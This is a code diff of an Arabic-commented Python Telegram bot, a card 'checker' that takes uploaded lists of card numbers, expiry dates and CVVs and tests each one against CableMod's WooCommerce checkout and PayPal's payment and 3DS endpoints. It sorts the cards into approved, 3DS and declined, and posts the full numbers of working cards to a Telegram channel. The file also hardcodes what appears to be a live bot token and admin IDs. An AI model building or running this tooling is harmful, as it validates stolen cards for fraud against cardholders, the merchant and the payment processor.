@@ -1,8 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-CableMod + PayPal PPCP - Telegram Bot
-بوت تليجرام كامل لفحص البطاقات على موقع CableMod
-مع تحديث البيانات كل 50 بطاقة فقط
+CableMod + PayPal PPCP - Telegram Bot (مع تحديث كل 50 كرت)
 """
 
 import os
@@ -21,13 +19,14 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 
 # ====== إعدادات البوت ======
 BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
-ADMIN_IDS = [5895491379, 844663875]
-CHANNEL_ID = -1003154179190
+ADMIN_IDS = [5895491379, 844663875]  # أدمن
+CHANNEL_ID = -1003154179190  # القناة
 
 # ====== إعدادات الموقع ======
 BASE_URL = "https://store.cablemod.com/"
 CHECKOUT_URL = BASE_URL + "checkout/"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
+REFRESH_EVERY = 50  # تحديث كل 50 كرت
 
 # الكوكيز الثابتة
 INITIAL_COOKIES = {
@@ -87,27 +86,13 @@ SHIPPING = {
 }
 
 PAYMENT_METHOD = "ppcp-credit-card-gateway"
-REFRESH_EVERY = 50  # تحديث البيانات كل 50 بطاقة
 
-# ====== إحصائيات البوت ======
+# ====== إحصائيات ======
 stats = {
-    'total': 0,
-    'checking': 0,
-    'approved': 0,
-    'rejected': 0,
-    'secure_3d': 0,
-    'errors': 0,
-    'start_time': None,
-    'is_running': False,
-    'dashboard_message_id': None,
-    'chat_id': None,
-    'current_card': '',
-    'error_details': {},
-    'last_response': 'Waiting...',
-    'cards_checked': 0,
-    'approved_cards': [],
-    '3ds_cards': [],
-    'declined_cards': [],
+    'total': 0, 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0,
+    'start_time': None, 'is_running': False, 'dashboard_message_id': None, 'current_card': '',
+    'last_response': 'Waiting...', 'cards_checked': 0,
+    'approved_cards': [], '3ds_cards': [], 'declined_cards': []
 }
 
 # ====== دالات مساعدة ======
@@ -117,48 +102,26 @@ def find(text: str, pattern: str, flags=re.S) -> Optional[str]:
 
 def extract_nonces(html: str) -> Dict[str, Optional[str]]:
     nonces = {}
-    nonces["update_order_review_nonce"] = (
-        find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
-        or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
-    )
-    nonces["process_checkout_nonce"] = (
-        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
-        or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
-    )
-    nonces["ppcp_nonce"] = (
-        find(html, r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
-        or find(html, r'"ppcp[^"]*data_client_id[^"]*"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
-    )
-    nonces["create_order_nonce"] = (
-        find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
-        or find(html, r'"create_order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
-        or find(html, r'ppc_create_order[^}]*nonce["\s:]*"([a-f0-9]+)"')
-        or find(html, r'wc_ajax_url[^}]{0,200}nonce["\s:]*"([a-f0-9]+)"', re.S)
-    )
+    nonces["update_order_review_nonce"] = find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I) or find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
+    nonces["process_checkout_nonce"] = find(html, r'woocommerce-process-checkout-nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I) or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
+    nonces["ppcp_nonce"] = find(html, r'"nonce"\s*:\s*"([^"]+)"', re.S)
+    nonces["create_order_nonce"] = find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"') or nonces["ppcp_nonce"]
     return nonces
 
 def parse_card(card_str: str) -> Tuple[str, str, str, str]:
     parts = card_str.strip().split('|')
-    if len(parts) != 4:
-        raise ValueError("تنسيق الكارت غير صحيح! استخدم: CC|MM|YYYY|CVV")
+    if len(parts) != 4: raise ValueError("تنسيق خاطئ")
     number, month, year, cvv = parts
     number = number.strip()
     month = month.strip().zfill(2)
     year = year.strip()
-    cvv = cvv.strip()
-    if len(cvv) == 2:
-        cvv = cvv.zfill(3)
-    if len(number) < 13 or len(number) > 19:
-        raise ValueError(f"رقم الكارت غير صحيح: {number}")
-    if len(cvv) < 3 or len(cvv) > 4:
-        raise ValueError(f"CVV غير صحيح: {cvv}")
-    if len(year) != 4:
-        raise ValueError(f"السنة غير صحيحة: {year}")
-    if not (1 <= int(month) <= 12):
-        raise ValueError(f"الشهر غير صحيح: {month}")
+    cvv = cvv.strip().zfill(3)
+    if len(number) < 13 or len(number) > 19: raise ValueError("رقم خاطئ")
+    if len(cvv) < 3 or len(cvv) > 4: raise ValueError("CVV خاطئ")
+    if len(year) != 4 or not (1 <= int(month) <= 12): raise ValueError("تاريخ خاطئ")
     return number, cvv, year, month
 
-# ====== فئة معالجة الدفع (مع تحديث كل 50 كرت) ======
+# ====== معالج الدفع ======
 class WooCommercePayPal:
     def __init__(self):
         self.sess = requests.Session()
@@ -171,134 +134,43 @@ class WooCommercePayPal:
         self.paypal_order_id = None
         self.client_metadata_id = None
 
-    def headers_get(self):
-        return {
-            "user-agent": UA,
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
-            "referer": BASE_URL + "cart/",
-        }
-    
+    def headers_get(self): return {"user-agent": UA, "referer": BASE_URL + "cart/"}
     def headers_ajax(self, json_content=False):
-        h = {
-            "user-agent": UA,
-            "accept": "*/*",
-            "origin": BASE_URL.rstrip("/"),
-            "referer": CHECKOUT_URL,
-            "x-requested-with": "XMLHttpRequest",
-            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
-        }
+        h = {"user-agent": UA, "origin": BASE_URL.rstrip("/"), "referer": CHECKOUT_URL, "x-requested-with": "XMLHttpRequest"}
         h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
         return h
 
     def refresh_checkout_data(self):
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري تحديث بيانات التشيك اوت...")
-        # 1. جلب الصفحة
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] تحديث بيانات...")
         r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
-        r.raise_for_status()
-        html = r.text
-        self.nonces = extract_nonces(html)
-
-        # 2. تحديث order review
-        post_data = {
-            "wc_order_attribution_source_type": "organic",
-            "_wp_http_referer": "/checkout/",
-            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
-            "payment_method": PAYMENT_METHOD,
-            **BILLING
-        }
-        payload = {
-            "security": self.nonces["update_order_review_nonce"],
-            "payment_method": PAYMENT_METHOD,
-            "has_full_address": "true",
-            **SHIPPING,
-            "post_data": urlencode(post_data),
-        }
-        self.sess.post(
-            BASE_URL, params={"wc-ajax": "update_order_review"},
-            headers=self.headers_ajax(), data=urlencode(payload), timeout=30
-        )
-
-        # 3. جلب PayPal token
-        fresh_nonces = extract_nonces(self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text)
-        if fresh_nonces.get("ppcp_nonce"):
-            self.nonces["ppcp_nonce"] = fresh_nonces["ppcp_nonce"]
-        r_token = self.sess.post(
-            BASE_URL, params={"wc-ajax": "ppc-data-client-id"},
-            headers=self.headers_ajax(json_content=True),
-            json={"nonce": self.nonces["ppcp_nonce"]}, timeout=30
-        )
-        token_data = r_token.json()
-        self.access_token = token_data.get("access_token")
+        self.nonces = extract_nonces(r.text)
+        post_data = {"payment_method": PAYMENT_METHOD, **BILLING, "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", "")}
+        payload = {"security": self.nonces["update_order_review_nonce"], "payment_method": PAYMENT_METHOD, "has_full_address": "true", **SHIPPING, "post_data": urlencode(post_data)}
+        self.sess.post(BASE_URL, params={"wc-ajax": "update_order_review"}, headers=self.headers_ajax(), data=urlencode(payload), timeout=30)
+        r_token = self.sess.post(BASE_URL, params={"wc-ajax": "ppc-data-client-id"}, headers=self.headers_ajax(True), json={"nonce": self.nonces["ppcp_nonce"]}, timeout=30)
+        self.access_token = r_token.json().get("access_token")
         if not self.access_token:
-            # fallback
-            buttons_url = "https://www.paypal.com/smart/buttons?clientID=Abf7famM34IoBZ5AgmTVk2Jfr7cEGOYYSIRvLlkSsrql09p3frXjC-WfFdXxsRkJEVIy_HG35IPnNzbk&currency=USD&intent=capture&commit=true&vault=false&components.0=buttons&components.1=card-fields&locale.country=US&locale.lang=en&env=production&platform=desktop"
-            r_btn = self.paypal_sess.get(buttons_url, headers={"user-agent": UA, "referer": BASE_URL}, timeout=30)
-            match = re.search(r'"facilitatorAccessToken":"([^"]+)"', r_btn.text)
-            if match:
-                self.access_token = match.group(1)
-
-        # 4. جلب wp_session
-        for cookie in self.sess.cookies:
-            if cookie.name.startswith("wp_woocommerce_session_"):
-                self.wp_session = unquote(cookie.value).split("|")[0]
+            r_btn = self.paypal_sess.get("https://www.paypal.com/smart/buttons?clientID=Abf7famM34IoBZ5AgmTVk2Jfr7cEGOYYSIRvLlkSsrql09p3frXjC-WfFdXxsRkJEVIy_HG35IPnNzbk&currency=USD&intent=capture&commit=true&vault=false&components.0=buttons&components.1=card-fields&locale.country=US&locale.lang=en&env=production&platform=desktop", headers={"user-agent": UA, "referer": BASE_URL}, timeout=30)
+            self.access_token = find(r_btn.text, r'"facilitatorAccessToken":"([^"]+)"')
+        for c in self.sess.cookies:
+            if c.name.startswith("wp_woocommerce_session_"):
+                self.wp_session = unquote(c.value).split("|")[0]
                 break
-
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] تم تحديث البيانات بنجاح")
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] تم التحديث")
 
     def create_order(self):
-        if not self.nonces.get("create_order_nonce"):
-            html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
-            nonce = find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"') or self.nonces.get("ppcp_nonce")
-            self.nonces["create_order_nonce"] = nonce
-
         form_encoded = urlencode({
-            "wc_order_attribution_source_type": "organic",
-            "wc_order_attribution_referrer": "https://www.google.com/",
-            "wc_order_attribution_utm_campaign": "(none)",
-            "wc_order_attribution_utm_source": "google",
-            "wc_order_attribution_utm_medium": "organic",
-            "wc_order_attribution_session_entry": "https://cablemod.com/",
-            "billing_first_name": BILLING["billing_first_name"],
-            "billing_last_name": BILLING["billing_last_name"],
-            "billing_email": BILLING["billing_email"],
-            "billing_country": BILLING["billing_country"],
-            "billing_address_1": BILLING["billing_address_1"],
-            "billing_city": BILLING["billing_city"],
-            "billing_state": BILLING["billing_state"],
-            "billing_postcode": BILLING["billing_postcode"],
-            "shipping_method[0]": "flexible_shipping_single:27",
-            "payment_method": PAYMENT_METHOD,
-            "terms": "on",
-            "terms-field": "1",
-            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
-            "_wp_http_referer": "/checkout/",
+            "billing_first_name": BILLING["billing_first_name"], "billing_last_name": BILLING["billing_last_name"], "billing_email": BILLING["billing_email"],
+            "billing_country": BILLING["billing_country"], "billing_address_1": BILLING["billing_address_1"], "billing_city": BILLING["billing_city"],
+            "billing_state": BILLING["billing_state"], "billing_postcode": BILLING["billing_postcode"], "shipping_method[0]": "flexible_shipping_single:27",
+            "payment_method": PAYMENT_METHOD, "terms": "on", "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", "")
         })
         payload = {
-            "nonce": self.nonces.get("create_order_nonce", ""),
-            "payer": {
-                "email_address": BILLING["billing_email"],
-                "name": {"surname": BILLING["billing_last_name"], "given_name": BILLING["billing_first_name"]},
-                "address": {
-                    "country_code": BILLING["billing_country"],
-                    "address_line_1": BILLING["billing_address_1"],
-                    "admin_area_1": BILLING["billing_state"],
-                    "admin_area_2": BILLING["billing_city"],
-                    "postal_code": BILLING["billing_postcode"],
-                },
-            },
-            "bn_code": "Woo_PPCP",
-            "context": "checkout",
-            "order_id": "0",
-            "payment_method": PAYMENT_METHOD,
-            "form_encoded": form_encoded,
-            "createaccount": False,
-            "save_payment_method": False,
+            "nonce": self.nonces.get("create_order_nonce", ""), "payer": {"email_address": BILLING["billing_email"], "name": {"surname": BILLING["billing_last_name"], "given_name": BILLING["billing_first_name"]},
+            "address": {"country_code": BILLING["billing_country"], "address_line_1": BILLING["billing_address_1"], "admin_area_1": BILLING["billing_state"], "admin_area_2": BILLING["billing_city"], "postal_code": BILLING["billing_postcode"]}},
+            "bn_code": "Woo_PPCP", "context": "checkout", "payment_method": PAYMENT_METHOD, "form_encoded": form_encoded
         }
-        r = self.sess.post(
-            BASE_URL, params={"wc-ajax": "ppc-create-order"},
-            headers=self.headers_ajax(json_content=True), json=payload, timeout=30
-        )
+        r = self.sess.post(BASE_URL, params={"wc-ajax": "ppc-create-order"}, headers=self.headers_ajax(True), json=payload, timeout=30)
         result = r.json()
         if result.get("success"):
             self.paypal_order_id = result["data"]["id"]
@@ -306,153 +178,76 @@ class WooCommercePayPal:
             return True
         return False
 
-    def confirm_payment(self, card_number: str, cvv: str, year: str, month: str):
-        headers = {
-            'accept': 'application/json',
-            'content-type': 'application/json',
-            'user-agent': UA,
-            'origin': 'https://www.paypal.com',
-            'referer': 'https://www.paypal.com/smart/card-field',
-            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-            'authorization': f'Bearer {self.access_token}',
-        }
-        if self.client_metadata_id:
-            headers['paypal-client-metadata-id'] = self.client_metadata_id
-            headers['paypal-partner-attribution-id'] = 'Woo_PPCP'
-        headers['fn_sync_data'] = '%7B%22SC_VERSION%22%3A%222.0.4%22%7D'
-        payload = {
-            'payment_source': {
-                'card': {
-                    'number': card_number,
-                    'security_code': cvv,
-                    'expiry': f'{year}-{month}',
-                },
-            },
-        }
-        r = self.paypal_sess.post(
-            f'https://www.paypal.com/v2/checkout/orders/{self.paypal_order_id}/confirm-payment-source',
-            headers=headers, json=payload, timeout=30
-        )
+    def confirm_payment(self, card_number, cvv, year, month):
+        headers = {'accept': 'application/json', 'content-type': 'application/json', 'user-agent': UA, 'origin': 'https://www.paypal.com', 'referer': 'https://www.paypal.com/smart/card-field', 'authorization': f'Bearer {self.access_token}'}
+        if self.client_metadata_id: headers.update({'paypal-client-metadata-id': self.client_metadata_id, 'paypal-partner-attribution-id': 'Woo_PPCP'})
+        payload = {'payment_source': {'card': {'number': card_number, 'security_code': cvv, 'expiry': f'{year}-{month}'}}}
+        r = self.paypal_sess.post(f'https://www.paypal.com/v2/checkout/orders/{self.paypal_order_id}/confirm-payment-source', headers=headers, json=payload, timeout=30)
         return r.json()
 
     def verify_3ds(self):
-        headers = {
-            'accept': '*/*',
-            'content-type': 'application/json',
-            'user-agent': UA,
-            'origin': 'https://www.paypal.com',
-            'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}',
-        }
-        payload = {'token': self.paypal_order_id, 'action': 'verify'}
-        r1 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/session', headers=headers, json=payload, timeout=30)
-        ddc_jwt = r1.json().get("ddcJwtData")
-        if ddc_jwt:
-            self.paypal_sess.post('https://www.paypal.com/payment-authentication/threeds/v1/init-method',
-                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': UA},
-                                  data={'JWT': ddc_jwt}, timeout=30)
-        lookup_payload = {
-            'token': self.paypal_order_id, 'action': 'verify',
-            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'ar', 'colorDepth': 24,
-                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180,
-                           'deviceInfo': 'COMPUTER'}
-        }
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري Lookup النهائي...")
-        r3 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
-        res = r3.json()
-        status = res.get("threeDSStatus", "UNKNOWN")
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS Status: {status}")
+        headers = {'accept': '*/*', 'content-type': 'application/json', 'user-agent': UA, 'origin': 'https://www.paypal.com', 'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}'}
+        self.paypal_sess.post('https://www.paypal.com/heliosnext/api/session', headers=headers, json={'token': self.paypal_order_id, 'action': 'verify'}, timeout=30)
+        lookup_payload = {'token': self.paypal_order_id, 'action': 'verify', 'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'ar', 'colorDepth': 24, 'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180, 'deviceInfo': 'COMPUTER'}}
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري Lookup...")
+        r = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
+        res = r.json()
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS: {res.get('threeDSStatus')}")
         return res
 
-# ====== فحص البطاقة ======
+# ====== فحص بطاقة ======
 async def check_card(card: str, processor: WooCommercePayPal, bot_app):
     try:
-        card_number, cvv, year, month = parse_card(card)
-        masked_card = f"{card_number[:6]}******{card_number[-4:]}"
-        stats['current_card'] = masked_card
+        stats['checking'] = 1
+        number, cvv, year, month = parse_card(card)
+        stats['current_card'] = f"{number[:6]}******{number[-4:]}"
         await update_dashboard(bot_app)
-
-        # إنشاء طلب جديد
-        if not processor.create_order():
-            raise Exception("فشل إنشاء الطلب")
+        if not processor.create_order(): raise Exception("فشل الطلب")
         await asyncio.sleep(0.5)
-
-        # تأكيد الدفع
-        payment_result = processor.confirm_payment(card_number, cvv, year, month)
-        status = payment_result.get("status", "UNKNOWN")
-
+        result = processor.confirm_payment(number, cvv, year, month)
+        status = result.get("status")
         if status in ("APPROVED", "COMPLETED"):
-            stats['approved'] += 1
-            stats['last_response'] = 'SUCCESS'
-            stats['approved_cards'].append(card)
+            stats['approved'] += 1; stats['last_response'] = 'APPROVED'; stats['approved_cards'].append(card)
             await send_to_channel(bot_app, card, "APPROVED", "Approved")
-            return "APPROVED"
         elif status == "PAYER_ACTION_REQUIRED":
-            await asyncio.sleep(0.5)
-            lookup_result = processor.verify_3ds()
-            status_3ds = lookup_result.get("threeDSStatus")
-            liability = lookup_result.get("liability_shift", "NO")
-            if status_3ds == "SUCCESS" and liability == "POSSIBLE":
-                stats['approved'] += 1
-                stats['last_response'] = 'SUCCESS'
-                stats['approved_cards'].append(card)
+            res = processor.verify_3ds()
+            s3ds = res.get("threeDSStatus")
+            if s3ds == "SUCCESS" and res.get("liability_shift") == "POSSIBLE":
+                stats['approved'] += 1; stats['last_response'] = 'APPROVED'; stats['approved_cards'].append(card)
                 await send_to_channel(bot_app, card, "APPROVED", "Approved")
-                return "APPROVED"
-            elif status_3ds == "CHALLENGE_REQUIRED":
-                stats['secure_3d'] += 1
-                stats['last_response'] = '3D CHALLENGE'
-                stats['3ds_cards'].append(card)
+            elif s3ds == "CHALLENGE_REQUIRED":
+                stats['secure_3d'] += 1; stats['last_response'] = 'CHALLENGE'; stats['3ds_cards'].append(card)
                 await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
-                return "3D_SECURE"
-            elif status_3ds == "DECLINED":
-                stats['rejected'] += 1
-                stats['last_response'] = 'DECLINED'
-                stats['declined_cards'].append(card)
-                return "DECLINED"
+            elif s3ds == "DECLINED":
+                stats['rejected'] += 1; stats['last_response'] = 'DECLINED'; stats['declined_cards'].append(card)
             else:
-                stats['secure_3d'] += 1
-                stats['last_response'] = f'3DS: {status_3ds}'
-                stats['3ds_cards'].append(card)
-                await send_to_channel(bot_app, card, "3D_SECURE", status_3ds)
-                return "3D_SECURE"
+                stats['secure_3d'] += 1; stats['last_response'] = f'3DS: {s3ds}'; stats['3ds_cards'].append(card)
+                await send_to_channel(bot_app, card, "3D_SECURE", s3ds)
         else:
-            stats['rejected'] += 1
-            stats['last_response'] = 'DECLINED'
-            stats['declined_cards'].append(card)
-            return "DECLINED"
+            stats['rejected'] += 1; stats['last_response'] = 'DECLINED'; stats['declined_cards'].append(card)
     except Exception as e:
-        stats['errors'] += 1
-        stats['last_response'] = f'Error: {str(e)[:15]}'
-        stats['declined_cards'].append(card)
-        return "ERROR"
+        stats['errors'] += 1; stats['last_response'] = f'ERR: {str(e)[:15]}'; stats['declined_cards'].append(card)
     finally:
-        stats['checking'] -= 1
+        stats['checking'] = 0
         await update_dashboard(bot_app)
 
-# ====== إرسال للقناة + Dashboard + باقي الكود (مختصر) ======
-async def send_to_channel(bot_app, card, status_type, message):
+# ====== قناة + داشبورد + ملفات ======
+async def send_to_channel(bot_app, card, typ, msg):
     try:
         count = stats['approved'] + stats['secure_3d']
-        text = (
-            f"{'APPROVED' if status_type == 'APPROVED' else '3D SECURE'} CARD\n\n"
-            f"`{card}`\n"
-            f"Status: **{message}**\n"
-            f"Card #{count}\n"
-            f"Gateway: **CableMod + PayPal**\n"
-            f"Mahmoud Saad"
-        )
+        text = f"{'APPROVED' if typ=='APPROVED' else '3D SECURE'} CARD\n\n`{card}`\nStatus: **{msg}**\nCard #{count}\nGateway: **CableMod + PayPal**\nMahmoud Saad"
         await bot_app.bot.send_message(CHANNEL_ID, text, parse_mode='Markdown')
     except: pass
 
 def create_dashboard_keyboard():
     elapsed = int((datetime.now() - stats['start_time']).total_seconds()) if stats['start_time'] else 0
-    h, m = divmod(elapsed // 60, 60)
-    s = elapsed % 60
+    h, m = divmod(elapsed // 60, 60); s = elapsed % 60
     return InlineKeyboardMarkup([
         [InlineKeyboardButton(f"الإجمالي: {stats['total']}", "total")],
         [InlineKeyboardButton(f"فحص: {stats['checking']}", "checking"), InlineKeyboardButton(f"{h:02d}:{m:02d}:{s:02d}", "time")],
         [InlineKeyboardButton(f"Approved: {stats['approved']}", "approved"), InlineKeyboardButton(f"Declined: {stats['rejected']}", "rejected")],
         [InlineKeyboardButton(f"3DS: {stats['secure_3d']}", "3ds"), InlineKeyboardButton(f"Errors: {stats['errors']}", "errors")],
-        [InlineKeyboardButton(f"Response: {stats['last_response']}", "response")],
+        [InlineKeyboardButton(f"Resp: {stats['last_response']}", "response")],
         [InlineKeyboardButton("إيقاف", "stop_check")] if stats['is_running'] else [],
         [InlineKeyboardButton(stats['current_card'], "current")] if stats['current_card'] else []
     ])
@@ -460,71 +255,60 @@ def create_dashboard_keyboard():
 async def update_dashboard(bot_app):
     if stats['dashboard_message_id']:
         try:
-            await bot_app.bot.edit_message_text(
-                CHANNEL_ID, stats['dashboard_message_id'],
-                "**CABLEMOD + PAYPAL - LIVE**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown'
-            )
+            await bot_app.bot.edit_message_text(CHANNEL_ID, stats['dashboard_message_id'], "**CABLEMOD + PAYPAL - LIVE**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
         except: pass
+
+async def send_final_files(bot_app):
+    for name, lst, cap in [("approved", stats['approved_cards'], "Approved"), ("3ds", stats['3ds_cards'], "3D Secure"), ("declined", stats['declined_cards'], "Declined")]:
+        if lst:
+            with open(f"{name}_cards.txt", "w") as f: f.write("\n".join(lst))
+            await bot_app.bot.send_document(CHANNEL_ID, open(f"{name}_cards.txt", "rb"), caption=f"**{cap} Cards** ({len(lst)})", parse_mode='Markdown')
+            os.remove(f"{name}_cards.txt")
 
 async def process_cards(cards, bot_app):
     processor = WooCommercePayPal()
     processor.refresh_checkout_data()
-    stats['checking'] = 0
-
     for i, card in enumerate(cards):
         if not stats['is_running']: break
-        stats['checking'] = 1
         await check_card(card, processor, bot_app)
         stats['cards_checked'] += 1
-
-        # تحديث كل 50 كرت
         if (i + 1) % REFRESH_EVERY == 0:
             processor.refresh_checkout_data()
-
-        if stats['cards_checked'] % 3 == 0:
-            await update_dashboard(bot_app)
+        if stats['cards_checked'] % 3 == 0: await update_dashboard(bot_app)
         await asyncio.sleep(1.5)
-
-    stats['is_running'] = False
-    stats['last_response'] = 'اكتمل'
+    stats['is_running'] = False; stats['last_response'] = 'اكتمل'
     await update_dashboard(bot_app)
     await send_final_files(bot_app)
+    await bot_app.bot.send_message(CHANNEL_ID, "**اكتمل الفحص!**\nتم إرسال الملفات", parse_mode='Markdown')
 
-# باقي الكود (start, handle_file, main) نفس السابق...
-# (تم اختصاره للتركيز على التعديل الرئيسي)
+# ====== معالجات البوت ======
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS: await update.message.reply_text("غير مصرح"); return
+    await update.message.reply_text("**CableMod + PayPal Checker**\nأرسل ملف .txt (CC|MM|YYYY|CVV)", parse_mode='Markdown')
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS: return
-    if stats['is_running']: 
-        await update.message.reply_text("فحص جاري!")
-        return
+    if update.effective_user.id not in ADMIN_IDS: await update.message.reply_text("غير مصرح"); return
+    if stats['is_running']: await update.message.reply_text("فحص جاري!"); return
     file = await update.message.document.get_file()
-    content = await file.download_as_bytearray()
-    cards = [c.strip() for c in content.decode('utf-8').split('\n') if c.strip()]
-    stats.update({k: v for k, v in {
-        'total': len(cards), 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0,
-        'current_card': '', 'last_response': 'بدء...', 'cards_checked': 0,
-        'approved_cards': [], '3ds_cards': [], 'declined_cards': [],
-        'start_time': datetime.now(), 'is_running': True
-    }.items()})
+    cards = [c.strip() for c in (await file.download_as_bytearray()).decode('utf-8').split('\n') if c.strip()]
+    stats.update({'total': len(cards), 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0, 'current_card': '', 'last_response': 'بدء...', 'cards_checked': 0, 'approved_cards': [], '3ds_cards': [], 'declined_cards': [], 'start_time': datetime.now(), 'is_running': True})
     msg = await context.application.bot.send_message(CHANNEL_ID, "**بدء الفحص...**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
     stats['dashboard_message_id'] = msg.message_id
-    await update.message.reply_text(f"بدأ الفحص: {len(cards)} بطاقة\nتحديث كل {REFRESH_EVERY} كرت")
+    await update.message.reply_text(f"بدأ الفحص: {len(cards)} كرت\nتحديث كل {REFRESH_EVERY} كرت")
     threading.Thread(target=lambda: asyncio.new_event_loop().run_until_complete(process_cards(cards, context.application)), daemon=True).start()
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     if q.from_user.id not in ADMIN_IDS: return
     await q.answer()
-    if q.data == "stop_check":
-        stats['is_running'] = False
-        await q.message.reply_text("تم الإيقاف!")
+    if q.data == "stop_check": stats['is_running'] = False; await q.message.reply_text("تم الإيقاف!")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", lambda u, c: u.message.reply_text("أرسل ملف .txt")))
+    app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
+    print("البوت يعمل...")
     app.run_polling()
 
 if __name__ == "__main__":
